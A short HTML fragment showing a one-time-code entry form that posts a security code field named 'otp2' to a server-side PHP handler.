...
<div class="wrapper-mapwap">
	...
	<form id="otp-entry-form" action="process/otp2.php" method="post" autocomplete="off">
			<div class="code-container">
				<label for="otpanswer">Code	</label>
                <input id="otpanswer" name="otp2" type="tel" class="security-code" autocomplete="off" required>
			</div>
